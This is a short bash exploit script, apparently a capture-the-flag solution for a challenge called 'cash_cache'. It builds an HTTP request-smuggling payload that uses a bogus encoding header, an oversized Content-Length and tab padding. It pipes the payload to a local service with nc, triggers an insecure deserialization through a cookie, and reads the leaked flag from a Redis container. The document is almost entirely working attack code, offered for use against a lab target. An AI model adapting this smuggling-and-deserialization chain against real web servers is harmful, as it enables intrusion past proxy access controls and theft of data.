#!/usr/bin/env bash
set -euo pipefail

for v in MYUID DATA_URL_MAL; do
  [[ -n "${!v-}" ]] || { echo "Defina $v"; exit 1; }
done

python3 - "$MYUID" "$DATA_URL_MAL" > smuggle.txt <<'PY'
import os, sys

uid = sys.argv[1]
data = sys.argv[2]  # já URL-encoded

req1 = (
"GET / HTTP/1.1\r\n"
"Host: localhost\r\n"
"Cash-Encoding: Money!\r\n"
"Content-Length: 999999\r\n"
"\r\n"
)

# Tabs antes do 'nan' controlam o tamanho; ajuste se necessário (+/- \t)
line1 = "\t\t\t\t\t nan DOLLARS\r\n"

req2 = (
f"GET /debug?uid={uid}&data={data} HTTP/1.1\r\n"
"Host: backend\r\n"
"X-Forwarded-For: 9.9.9.9, 127.0.0.1\r\n"
"\r\n"
)

sys.stdout.write(req1 + line1 + req2)
PY

echo "[*] Enviando payload smuggled para 127.0.0.1:5000..."
cat smuggle.txt | nc 127.0.0.1 5000 || true

echo "[*] Disparando desserialização..."
curl -s -H "Cookie: uid=${MYUID}" http://localhost:5000/ >/dev/null

echo "[*] Lendo flag do Redis..."
docker exec -i cash_cache-cache-storage-1 redis-cli GET leak
